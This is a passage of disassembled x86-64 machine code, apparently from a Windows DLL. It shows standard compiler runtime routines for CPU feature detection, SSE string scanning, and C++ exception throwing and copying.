   180002a4d:	0f 1f 00             	nopl   (%rax)
   180002a50:	48 8b 03             	mov    (%rbx),%rax
   180002a53:	48 85 c0             	test   %rax,%rax
   180002a56:	74 06                	je     0x180002a5e
   180002a58:	ff 15 02 f8 00 00    	call   *0xf802(%rip)        # 0x180012260
   180002a5e:	48 83 c3 08          	add    $0x8,%rbx
   180002a62:	48 3b df             	cmp    %rdi,%rbx
   180002a65:	72 e9                	jb     0x180002a50
   180002a67:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a6c:	48 83 c4 20          	add    $0x20,%rsp
   180002a70:	5f                   	pop    %rdi
   180002a71:	c3                   	ret
   180002a72:	cc                   	int3
   180002a73:	cc                   	int3
   180002a74:	cc                   	int3
   180002a75:	cc                   	int3
   180002a76:	cc                   	int3
   180002a77:	cc                   	int3
   180002a78:	cc                   	int3
   180002a79:	cc                   	int3
   180002a7a:	cc                   	int3
   180002a7b:	cc                   	int3
   180002a7c:	cc                   	int3
   180002a7d:	cc                   	int3
   180002a7e:	cc                   	int3
   180002a7f:	cc                   	int3
   180002a80:	c2 00 00             	ret    $0x0
   180002a83:	cc                   	int3
   180002a84:	cc                   	int3
   180002a85:	cc                   	int3
   180002a86:	cc                   	int3
   180002a87:	cc                   	int3
   180002a88:	cc                   	int3
   180002a89:	cc                   	int3
   180002a8a:	cc                   	int3
   180002a8b:	cc                   	int3
   180002a8c:	cc                   	int3
   180002a8d:	cc                   	int3
   180002a8e:	cc                   	int3
   180002a8f:	cc                   	int3
   180002a90:	40 56                	rex push %rsi
   180002a92:	57                   	push   %rdi
   180002a93:	41 56                	push   %r14
   180002a95:	48 83 ec 10          	sub    $0x10,%rsp
   180002a99:	33 c9                	xor    %ecx,%ecx
   180002a9b:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180002aa0:	33 c0                	xor    %eax,%eax
   180002aa2:	0f a2                	cpuid
   180002aa4:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   180002aaa:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   180002ab0:	0b d1                	or     %ecx,%edx
   180002ab2:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   180002ab8:	44 8b d8             	mov    %eax,%r11d
   180002abb:	0b d3                	or     %ebx,%edx
   180002abd:	b8 01 00 00 00       	mov    $0x1,%eax
   180002ac2:	b9 00 00 00 00       	mov    $0x0,%ecx
   180002ac7:	0f a2                	cpuid
   180002ac9:	8b f9                	mov    %ecx,%edi
   180002acb:	75 5e                	jne    0x180002b2b
   180002acd:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180002ad2:	48 c7 05 7b a5 01 00 	movq   $0x8000,0x1a57b(%rip)        # 0x18001d058
   180002ad9:	00 80 00 00 
   180002add:	48 c7 05 78 a5 01 00 	movq   $0xffffffffffffffff,0x1a578(%rip)        # 0x18001d060
   180002ae4:	ff ff ff ff 
   180002ae8:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180002aed:	74 28                	je     0x180002b17
   180002aef:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180002af4:	74 21                	je     0x180002b17
   180002af6:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180002afb:	74 1a                	je     0x180002b17
   180002afd:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180002b02:	83 f8 20             	cmp    $0x20,%eax
   180002b05:	77 24                	ja     0x180002b2b
   180002b07:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180002b0e:	00 00 00 
   180002b11:	48 0f a3 c1          	bt     %rax,%rcx
   180002b15:	73 14                	jae    0x180002b2b
   180002b17:	44 8b 05 0e b1 01 00 	mov    0x1b10e(%rip),%r8d        # 0x18001dc2c
   180002b1e:	41 83 c8 01          	or     $0x1,%r8d
   180002b22:	44 89 05 03 b1 01 00 	mov    %r8d,0x1b103(%rip)        # 0x18001dc2c
   180002b29:	eb 07                	jmp    0x180002b32
   180002b2b:	44 8b 05 fa b0 01 00 	mov    0x1b0fa(%rip),%r8d        # 0x18001dc2c
   180002b32:	45 33 d2             	xor    %r10d,%r10d
   180002b35:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   180002b3a:	45 33 f6             	xor    %r14d,%r14d
   180002b3d:	33 f6                	xor    %esi,%esi
   180002b3f:	41 83 fb 07          	cmp    $0x7,%r11d
   180002b43:	7c 58                	jl     0x180002b9d
   180002b45:	33 c9                	xor    %ecx,%ecx
   180002b47:	b8 07 00 00 00       	mov    $0x7,%eax
   180002b4c:	0f a2                	cpuid
   180002b4e:	8b ea                	mov    %edx,%ebp
   180002b50:	44 8b cb             	mov    %ebx,%r9d
   180002b53:	0f ba e3 09          	bt     $0x9,%ebx
   180002b57:	73 0b                	jae    0x180002b64
   180002b59:	41 83 c8 02          	or     $0x2,%r8d
   180002b5d:	44 89 05 c8 b0 01 00 	mov    %r8d,0x1b0c8(%rip)        # 0x18001dc2c
   180002b64:	83 f8 01             	cmp    $0x1,%eax
   180002b67:	7c 0f                	jl     0x180002b78
   180002b69:	b8 07 00 00 00       	mov    $0x7,%eax
   180002b6e:	b9 01 00 00 00       	mov    $0x1,%ecx
   180002b73:	0f a2                	cpuid
   180002b75:	44 8b d2             	mov    %edx,%r10d
   180002b78:	41 83 fb 24          	cmp    $0x24,%r11d
   180002b7c:	7c 0c                	jl     0x180002b8a
   180002b7e:	b8 24 00 00 00       	mov    $0x24,%eax
   180002b83:	33 c9                	xor    %ecx,%ecx
   180002b85:	0f a2                	cpuid
   180002b87:	44 8b f3             	mov    %ebx,%r14d
   180002b8a:	41 83 fb 29          	cmp    $0x29,%r11d
   180002b8e:	7c 12                	jl     0x180002ba2
   180002b90:	b8 29 00 00 00       	mov    $0x29,%eax
   180002b95:	33 c9                	xor    %ecx,%ecx
   180002b97:	0f a2                	cpuid
   180002b99:	8b f3                	mov    %ebx,%esi
   180002b9b:	eb 05                	jmp    0x180002ba2
   180002b9d:	45 33 c9             	xor    %r9d,%r9d
   180002ba0:	33 ed                	xor    %ebp,%ebp
   180002ba2:	48 8b 05 bf a4 01 00 	mov    0x1a4bf(%rip),%rax        # 0x18001d068
   180002ba9:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180002bae:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   180002bb2:	c7 05 94 a4 01 00 01 	movl   $0x1,0x1a494(%rip)        # 0x18001d050
   180002bb9:	00 00 00 
   180002bbc:	c7 05 8e a4 01 00 02 	movl   $0x2,0x1a48e(%rip)        # 0x18001d054
   180002bc3:	00 00 00 
   180002bc6:	48 89 05 9b a4 01 00 	mov    %rax,0x1a49b(%rip)        # 0x18001d068
   180002bcd:	0f ba e7 14          	bt     $0x14,%edi
   180002bd1:	73 1f                	jae    0x180002bf2
   180002bd3:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   180002bd7:	c7 05 6f a4 01 00 02 	movl   $0x2,0x1a46f(%rip)        # 0x18001d050
   180002bde:	00 00 00 
   180002be1:	48 89 05 80 a4 01 00 	mov    %rax,0x1a480(%rip)        # 0x18001d068
   180002be8:	c7 05 62 a4 01 00 06 	movl   $0x6,0x1a462(%rip)        # 0x18001d054
   180002bef:	00 00 00 
   180002bf2:	0f ba e7 1b          	bt     $0x1b,%edi
   180002bf6:	0f 83 2c 01 00 00    	jae    0x180002d28
   180002bfc:	33 c9                	xor    %ecx,%ecx
   180002bfe:	0f 01 d0             	xgetbv
   180002c01:	48 c1 e2 20          	shl    $0x20,%rdx
   180002c05:	48 0b d0             	or     %rax,%rdx
   180002c08:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   180002c0d:	0f ba e7 1c          	bt     $0x1c,%edi
   180002c11:	0f 83 ed 00 00 00    	jae    0x180002d04
   180002c17:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002c1c:	24 06                	and    $0x6,%al
   180002c1e:	3c 06                	cmp    $0x6,%al
   180002c20:	0f 85 de 00 00 00    	jne    0x180002d04
   180002c26:	8b 05 28 a4 01 00    	mov    0x1a428(%rip),%eax        # 0x18001d054
   180002c2c:	83 c8 08             	or     $0x8,%eax
   180002c2f:	c7 05 17 a4 01 00 03 	movl   $0x3,0x1a417(%rip)        # 0x18001d050
   180002c36:	00 00 00 
   180002c39:	89 05 15 a4 01 00    	mov    %eax,0x1a415(%rip)        # 0x18001d054
   180002c3f:	41 f6 c1 20          	test   $0x20,%r9b
   180002c43:	74 65                	je     0x180002caa
   180002c45:	83 c8 20             	or     $0x20,%eax
   180002c48:	c7 05 fe a3 01 00 05 	movl   $0x5,0x1a3fe(%rip)        # 0x18001d050
   180002c4f:	00 00 00 
   180002c52:	89 05 fc a3 01 00    	mov    %eax,0x1a3fc(%rip)        # 0x18001d054
   180002c58:	41 81 e1 00 00 03 d0 	and    $0xd0030000,%r9d
   180002c5f:	48 8b 05 02 a4 01 00 	mov    0x1a402(%rip),%rax        # 0x18001d068
   180002c66:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180002c6a:	48 89 05 f7 a3 01 00 	mov    %rax,0x1a3f7(%rip)        # 0x18001d068
   180002c71:	41 81 f9 00 00 03 d0 	cmp    $0xd0030000,%r9d
   180002c78:	75 37                	jne    0x180002cb1
   180002c7a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002c7f:	24 e0                	and    $0xe0,%al
   180002c81:	3c e0                	cmp    $0xe0,%al
   180002c83:	75 25                	jne    0x180002caa
   180002c85:	48 8b 05 dc a3 01 00 	mov    0x1a3dc(%rip),%rax        # 0x18001d068
   180002c8c:	83 0d c1 a3 01 00 40 	orl    $0x40,0x1a3c1(%rip)        # 0x18001d054
   180002c93:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180002c97:	c7 05 af a3 01 00 06 	movl   $0x6,0x1a3af(%rip)        # 0x18001d050
   180002c9e:	00 00 00 
   180002ca1:	48 89 05 c0 a3 01 00 	mov    %rax,0x1a3c0(%rip)        # 0x18001d068
   180002ca8:	eb 07                	jmp    0x180002cb1
   180002caa:	48 8b 05 b7 a3 01 00 	mov    0x1a3b7(%rip),%rax        # 0x18001d068
   180002cb1:	0f ba e5 17          	bt     $0x17,%ebp
   180002cb5:	73 0c                	jae    0x180002cc3
   180002cb7:	48 0f ba f0 18       	btr    $0x18,%rax
   180002cbc:	48 89 05 a5 a3 01 00 	mov    %rax,0x1a3a5(%rip)        # 0x18001d068
   180002cc3:	41 0f ba e2 13       	bt     $0x13,%r10d
   180002cc8:	73 3a                	jae    0x180002d04
   180002cca:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002ccf:	24 e0                	and    $0xe0,%al
   180002cd1:	3c e0                	cmp    $0xe0,%al
   180002cd3:	75 2f                	jne    0x180002d04
   180002cd5:	48 8b 0d 8c a3 01 00 	mov    0x1a38c(%rip),%rcx        # 0x18001d068
   180002cdc:	48 81 e1 d0 ff ff fe 	and    $0xfffffffffeffffd0,%rcx
   180002ce3:	41 0f b6 c6          	movzbl %r14b,%eax
   180002ce7:	89 05 43 af 01 00    	mov    %eax,0x1af43(%rip)        # 0x18001dc30
   180002ced:	48 89 0d 74 a3 01 00 	mov    %rcx,0x1a374(%rip)        # 0x18001d068
   180002cf4:	83 f8 01             	cmp    $0x1,%eax
   180002cf7:	76 0b                	jbe    0x180002d04
   180002cf9:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180002cfd:	48 89 0d 64 a3 01 00 	mov    %rcx,0x1a364(%rip)        # 0x18001d068
   180002d04:	41 0f ba e2 15       	bt     $0x15,%r10d
   180002d09:	73 1d                	jae    0x180002d28
   180002d0b:	40 f6 c6 01          	test   $0x1,%sil
   180002d0f:	74 17                	je     0x180002d28
   180002d11:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002d16:	48 0f ba e0 13       	bt     $0x13,%rax
   180002d1b:	73 0b                	jae    0x180002d28
   180002d1d:	48 81 25 40 a3 01 00 	andq   $0xffffffffffffff7f,0x1a340(%rip)        # 0x18001d068
   180002d24:	7f ff ff ff 
   180002d28:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180002d2d:	33 c0                	xor    %eax,%eax
   180002d2f:	48 83 c4 10          	add    $0x10,%rsp
   180002d33:	41 5e                	pop    %r14
   180002d35:	5f                   	pop    %rdi
   180002d36:	5e                   	pop    %rsi
   180002d37:	c3                   	ret
   180002d38:	cc                   	int3
   180002d39:	cc                   	int3
   180002d3a:	cc                   	int3
   180002d3b:	cc                   	int3
   180002d3c:	cc                   	int3
   180002d3d:	cc                   	int3
   180002d3e:	cc                   	int3
   180002d3f:	cc                   	int3
   180002d40:	b8 01 00 00 00       	mov    $0x1,%eax
   180002d45:	c3                   	ret
   180002d46:	cc                   	int3
   180002d47:	cc                   	int3
   180002d48:	cc                   	int3
   180002d49:	cc                   	int3
   180002d4a:	cc                   	int3
   180002d4b:	cc                   	int3
   180002d4c:	cc                   	int3
   180002d4d:	cc                   	int3
   180002d4e:	cc                   	int3
   180002d4f:	cc                   	int3
   180002d50:	33 c0                	xor    %eax,%eax
   180002d52:	39 05 20 b9 01 00    	cmp    %eax,0x1b920(%rip)        # 0x18001e678
   180002d58:	0f 95 c0             	setne  %al
   180002d5b:	c3                   	ret
   180002d5c:	cc                   	int3
   180002d5d:	cc                   	int3
   180002d5e:	cc                   	int3
   180002d5f:	cc                   	int3
   180002d60:	48 8b c1             	mov    %rcx,%rax
   180002d63:	84 d2                	test   %dl,%dl
   180002d65:	75 46                	jne    0x180002dad
   180002d67:	48 8b d1             	mov    %rcx,%rdx
   180002d6a:	83 e0 0f             	and    $0xf,%eax
   180002d6d:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180002d71:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002d74:	8b c8                	mov    %eax,%ecx
   180002d76:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
   180002d7c:	41 d3 e3             	shl    %cl,%r11d
   180002d7f:	66 0f 74 02          	pcmpeqb (%rdx),%xmm0
   180002d83:	66 44 0f d7 c0       	pmovmskb %xmm0,%r8d
   180002d88:	45 23 c3             	and    %r11d,%r8d
   180002d8b:	75 18                	jne    0x180002da5
   180002d8d:	0f 1f 00             	nopl   (%rax)
   180002d90:	48 83 c2 10          	add    $0x10,%rdx
   180002d94:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002d97:	66 0f 74 02          	pcmpeqb (%rdx),%xmm0
   180002d9b:	66 44 0f d7 c0       	pmovmskb %xmm0,%r8d
   180002da0:	45 85 c0             	test   %r8d,%r8d
   180002da3:	74 eb                	je     0x180002d90
   180002da5:	41 0f bc c0          	bsf    %r8d,%eax
   180002da9:	48 03 c2             	add    %rdx,%rax
   180002dac:	c3                   	ret
   180002dad:	45 33 c0             	xor    %r8d,%r8d
   180002db0:	83 3d 99 a2 01 00 02 	cmpl   $0x2,0x1a299(%rip)        # 0x18001d050
   180002db7:	0f 8d 9f 00 00 00    	jge    0x180002e5c
   180002dbd:	0f b6 ca             	movzbl %dl,%ecx
   180002dc0:	4c 8b c8             	mov    %rax,%r9
   180002dc3:	83 e0 0f             	and    $0xf,%eax
   180002dc6:	8b d1                	mov    %ecx,%edx
   180002dc8:	c1 e2 08             	shl    $0x8,%edx
   180002dcb:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180002dcf:	0b d1                	or     %ecx,%edx
   180002dd1:	0f 57 db             	xorps  %xmm3,%xmm3
   180002dd4:	8b c8                	mov    %eax,%ecx
   180002dd6:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
   180002ddc:	41 d3 e3             	shl    %cl,%r11d
   180002ddf:	f3 41 0f 6f 11       	movdqu (%r9),%xmm2
   180002de4:	66 0f 6e c2          	movd   %edx,%xmm0
   180002de8:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180002ded:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   180002df1:	66 0f 70 e1 00       	pshufd $0x0,%xmm1,%xmm4
   180002df6:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   180002dfa:	66 0f 74 d4          	pcmpeqb %xmm4,%xmm2
   180002dfe:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180002e02:	66 44 0f d7 d2       	pmovmskb %xmm2,%r10d
   180002e07:	45 23 d3             	and    %r11d,%r10d
   180002e0a:	41 23 c3             	and    %r11d,%eax
   180002e0d:	75 32                	jne    0x180002e41
   180002e0f:	90                   	nop
   180002e10:	f3 41 0f 6f 49 10    	movdqu 0x10(%r9),%xmm1
   180002e16:	41 0f bd ca          	bsr    %r10d,%ecx
   180002e1a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002e1e:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
   180002e22:	49 03 c9             	add    %r9,%rcx
   180002e25:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   180002e29:	45 85 d2             	test   %r10d,%r10d
   180002e2c:	66 0f 74 c4          	pcmpeqb %xmm4,%xmm0
   180002e30:	66 44 0f d7 d0       	pmovmskb %xmm0,%r10d
   180002e35:	4c 0f 45 c1          	cmovne %rcx,%r8
   180002e39:	49 83 c1 10          	add    $0x10,%r9
   180002e3d:	85 c0                	test   %eax,%eax
   180002e3f:	74 cf                	je     0x180002e10
   180002e41:	8b d0                	mov    %eax,%edx
   180002e43:	f7 da                	neg    %edx
   180002e45:	23 d0                	and    %eax,%edx
   180002e47:	ff ca                	dec    %edx
   180002e49:	41 23 d2             	and    %r10d,%edx
   180002e4c:	0f bd ca             	bsr    %edx,%ecx
   180002e4f:	49 03 c9             	add    %r9,%rcx
   180002e52:	85 d2                	test   %edx,%edx
   180002e54:	4c 0f 45 c1          	cmovne %rcx,%r8
   180002e58:	49 8b c0             	mov    %r8,%rax
   180002e5b:	c3                   	ret
   180002e5c:	a8 0f                	test   $0xf,%al
   180002e5e:	74 14                	je     0x180002e74
   180002e60:	0f b6 08             	movzbl (%rax),%ecx
   180002e63:	3a ca                	cmp    %dl,%cl
   180002e65:	4c 0f 44 c0          	cmove  %rax,%r8
   180002e69:	84 c9                	test   %cl,%cl
   180002e6b:	74 eb                	je     0x180002e58
   180002e6d:	48 ff c0             	inc    %rax
   180002e70:	a8 0f                	test   $0xf,%al
   180002e72:	75 ec                	jne    0x180002e60
   180002e74:	0f b6 ca             	movzbl %dl,%ecx
   180002e77:	66 0f 6e c9          	movd   %ecx,%xmm1
   180002e7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e80:	f3 0f 6f 00          	movdqu (%rax),%xmm0
   180002e84:	66 0f 3a 63 c8 40    	pcmpistri $0x40,%xmm0,%xmm1
   180002e8a:	73 0c                	jae    0x180002e98
   180002e8c:	4c 63 c1             	movslq %ecx,%r8
   180002e8f:	4c 03 c0             	add    %rax,%r8
   180002e92:	66 0f 3a 63 c8 40    	pcmpistri $0x40,%xmm0,%xmm1
   180002e98:	74 be                	je     0x180002e58
   180002e9a:	48 83 c0 10          	add    $0x10,%rax
   180002e9e:	eb e0                	jmp    0x180002e80
   180002ea0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002ea5:	57                   	push   %rdi
   180002ea6:	48 83 ec 20          	sub    $0x20,%rsp
   180002eaa:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   180002eae:	48 8b fa             	mov    %rdx,%rdi
   180002eb1:	48 8b d9             	mov    %rcx,%rbx
   180002eb4:	74 6a                	je     0x180002f20
   180002eb6:	4c 8b 01             	mov    (%rcx),%r8
   180002eb9:	4d 85 c0             	test   %r8,%r8
   180002ebc:	74 62                	je     0x180002f20
   180002ebe:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180002ec3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   180002eca:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180002ecf:	90                   	nop
   180002ed0:	41 80 7c 00 01 00    	cmpb   $0x0,0x1(%r8,%rax,1)
   180002ed6:	48 8d 40 01          	lea    0x1(%rax),%rax
   180002eda:	75 f4                	jne    0x180002ed0
   180002edc:	48 8d 68 01          	lea    0x1(%rax),%rbp
   180002ee0:	48 8b cd             	mov    %rbp,%rcx
   180002ee3:	e8 c8 52 00 00       	call   0x1800081b0
   180002ee8:	48 8b f0             	mov    %rax,%rsi
   180002eeb:	48 85 c0             	test   %rax,%rax
   180002eee:	74 15                	je     0x180002f05
   180002ef0:	4c 8b 03             	mov    (%rbx),%r8
   180002ef3:	48 8b d5             	mov    %rbp,%rdx
   180002ef6:	48 8b c8             	mov    %rax,%rcx
   180002ef9:	e8 e2 60 00 00       	call   0x180008fe0
   180002efe:	48 89 37             	mov    %rsi,(%rdi)
   180002f01:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   180002f05:	33 c9                	xor    %ecx,%ecx
   180002f07:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002f0c:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   180002f11:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002f16:	48 83 c4 20          	add    $0x20,%rsp
   180002f1a:	5f                   	pop    %rdi
   180002f1b:	e9 10 53 00 00       	jmp    0x180008230
   180002f20:	48 8b 01             	mov    (%rcx),%rax
   180002f23:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002f28:	48 89 02             	mov    %rax,(%rdx)
   180002f2b:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   180002f2f:	48 83 c4 20          	add    $0x20,%rsp
   180002f33:	5f                   	pop    %rdi
   180002f34:	c3                   	ret
   180002f35:	cc                   	int3
   180002f36:	cc                   	int3
   180002f37:	cc                   	int3
   180002f38:	cc                   	int3
   180002f39:	cc                   	int3
   180002f3a:	cc                   	int3
   180002f3b:	cc                   	int3
   180002f3c:	cc                   	int3
   180002f3d:	cc                   	int3
   180002f3e:	cc                   	int3
   180002f3f:	cc                   	int3
   180002f40:	40 53                	rex push %rbx
   180002f42:	48 83 ec 20          	sub    $0x20,%rsp
   180002f46:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   180002f4a:	48 8b d9             	mov    %rcx,%rbx
   180002f4d:	74 19                	je     0x180002f68
   180002f4f:	48 8b 09             	mov    (%rcx),%rcx
   180002f52:	e8 d9 52 00 00       	call   0x180008230
   180002f57:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   180002f5b:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   180002f62:	48 83 c4 20          	add    $0x20,%rsp
   180002f66:	5b                   	pop    %rbx
   180002f67:	c3                   	ret
   180002f68:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   180002f6c:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   180002f73:	48 83 c4 20          	add    $0x20,%rsp
   180002f77:	5b                   	pop    %rbx
   180002f78:	c3                   	ret
   180002f79:	cc                   	int3
   180002f7a:	cc                   	int3
   180002f7b:	cc                   	int3
   180002f7c:	cc                   	int3
   180002f7d:	cc                   	int3
   180002f7e:	cc                   	int3
   180002f7f:	cc                   	int3
   180002f80:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002f85:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180002f8a:	57                   	push   %rdi
   180002f8b:	48 83 ec 50          	sub    $0x50,%rsp
   180002f8f:	48 8b da             	mov    %rdx,%rbx
   180002f92:	48 8b f1             	mov    %rcx,%rsi
   180002f95:	bf 20 05 93 19       	mov    $0x19930520,%edi
   180002f9a:	48 85 d2             	test   %rdx,%rdx
   180002f9d:	74 1d                	je     0x180002fbc
   180002f9f:	f6 02 10             	testb  $0x10,(%rdx)
   180002fa2:	74 18                	je     0x180002fbc
   180002fa4:	48 8b 09             	mov    (%rcx),%rcx
   180002fa7:	48 83 c1 f8          	add    $0xfffffffffffffff8,%rcx
   180002fab:	48 8b 01             	mov    (%rcx),%rax
   180002fae:	48 8b 58 30          	mov    0x30(%rax),%rbx
   180002fb2:	48 8b 40 40          	mov    0x40(%rax),%rax
   180002fb6:	ff 15 a4 f2 00 00    	call   *0xf2a4(%rip)        # 0x180012260
   180002fbc:	33 c0                	xor    %eax,%eax
   180002fbe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002fc3:	48 85 db             	test   %rbx,%rbx
   180002fc6:	74 22                	je     0x180002fea
   180002fc8:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002fcd:	48 8b cb             	mov    %rbx,%rcx
   180002fd0:	ff 15 9a f0 00 00    	call   *0xf09a(%rip)        # 0x180012070
   180002fd6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002fdb:	f6 03 08             	testb  $0x8,(%rbx)
   180002fde:	75 05                	jne    0x180002fe5
   180002fe0:	48 85 c0             	test   %rax,%rax
   180002fe3:	75 05                	jne    0x180002fea
   180002fe5:	bf 00 40 99 01       	mov    $0x1994000,%edi
   180002fea:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   180002fef:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   180002ff4:	ba 01 00 00 00       	mov    $0x1,%edx
   180002ff9:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180002ffe:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   180003003:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180003008:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   18000300e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003013:	ff 15 5f f0 00 00    	call   *0xf05f(%rip)        # 0x180012078
   180003019:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000301e:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   180003023:	48 83 c4 50          	add    $0x50,%rsp
   180003027:	5f                   	pop    %rdi
   180003028:	c3                   	ret
   180003029:	cc                   	int3
   18000302a:	cc                   	int3
   18000302b:	cc                   	int3
   18000302c:	cc                   	int3
   18000302d:	cc                   	int3
   18000302e:	cc                   	int3
   18000302f:	cc                   	int3
   180003030:	48 8b c4             	mov    %rsp,%rax
   180003033:	4c 89 48 20          	mov    %r9,0x20(%rax)
   180003037:	4c 89 40 18          	mov    %r8,0x18(%rax)
   18000303b:	48 89 50 10          	mov    %rdx,0x10(%rax)
   18000303f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180003043:	53                   	push   %rbx
   180003044:	57                   	push   %rdi
   180003045:	48 83 ec 68          	sub    $0x68,%rsp
   180003049:	48 8b d9             	mov    %rcx,%rbx
   18000304c:	33 ff                	xor    %edi,%edi
   18000304e:	89 78 c8             	mov    %edi,-0x38(%rax)
   180003051:	48 89 48 d8          	mov    %rcx,-0x28(%rax)
   180003055:	4c 89 40 e0          	mov    %r8,-0x20(%rax)
   180003059:	e8 62 13 00 00       	call   0x1800043c0
   18000305e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003063:	8b 0b                	mov    (%rbx),%ecx
   180003065:	48 8b 40 10          	mov    0x10(%rax),%rax
   180003069:	ff 15 f1 f1 00 00    	call   *0xf1f1(%rip)        # 0x180012260
   18000306f:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   180003073:	eb 00                	jmp    0x180003075
   180003075:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003079:	48 83 c4 68          	add    $0x68,%rsp
   18000307d:	5f                   	pop    %rdi
   18000307e:	5b                   	pop    %rbx
   18000307f:	c3                   	ret
   180003080:	48 8b c4             	mov    %rsp,%rax
   180003083:	4c 89 48 20          	mov    %r9,0x20(%rax)
   180003087:	4c 89 40 18          	mov    %r8,0x18(%rax)
   18000308b:	48 89 50 10          	mov    %rdx,0x10(%rax)
   18000308f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180003093:	53                   	push   %rbx
   180003094:	57                   	push   %rdi
   180003095:	48 83 ec 68          	sub    $0x68,%rsp
   180003099:	48 8b d9             	mov    %rcx,%rbx
   18000309c:	33 ff                	xor    %edi,%edi
   18000309e:	89 78 c8             	mov    %edi,-0x38(%rax)
   1800030a1:	48 89 48 d8          	mov    %rcx,-0x28(%rax)
   1800030a5:	4c 89 40 e0          	mov    %r8,-0x20(%rax)
   1800030a9:	e8 12 13 00 00       	call   0x1800043c0
   1800030ae:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800030b3:	8b 0b                	mov    (%rbx),%ecx
   1800030b5:	48 8b 40 10          	mov    0x10(%rax),%rax
   1800030b9:	ff 15 a1 f1 00 00    	call   *0xf1a1(%rip)        # 0x180012260
   1800030bf:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   1800030c3:	eb 00                	jmp    0x1800030c5
   1800030c5:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800030c9:	48 83 c4 68          	add    $0x68,%rsp
   1800030cd:	5f                   	pop    %rdi
   1800030ce:	5b                   	pop    %rbx
   1800030cf:	c3                   	ret
   1800030d0:	40 53                	rex push %rbx
   1800030d2:	55                   	push   %rbp
   1800030d3:	56                   	push   %rsi
   1800030d4:	57                   	push   %rdi
   1800030d5:	0f b6 19             	movzbl (%rcx),%ebx
   1800030d8:	4c 8d 51 01          	lea    0x1(%rcx),%r10
   1800030dc:	88 1a                	mov    %bl,(%rdx)
   1800030de:	41 8b f9             	mov    %r9d,%edi
   1800030e1:	48 8d 2d 18 cf ff ff 	lea    -0x30e8(%rip),%rbp        # 0x180000000
   1800030e8:	4d 8b c8             	mov    %r8,%r9
   1800030eb:	4c 8b da             	mov    %rdx,%r11
   1800030ee:	48 8b f1             	mov    %rcx,%rsi
   1800030f1:	f6 c3 04             	test   $0x4,%bl
   1800030f4:	74 24                	je     0x18000311a
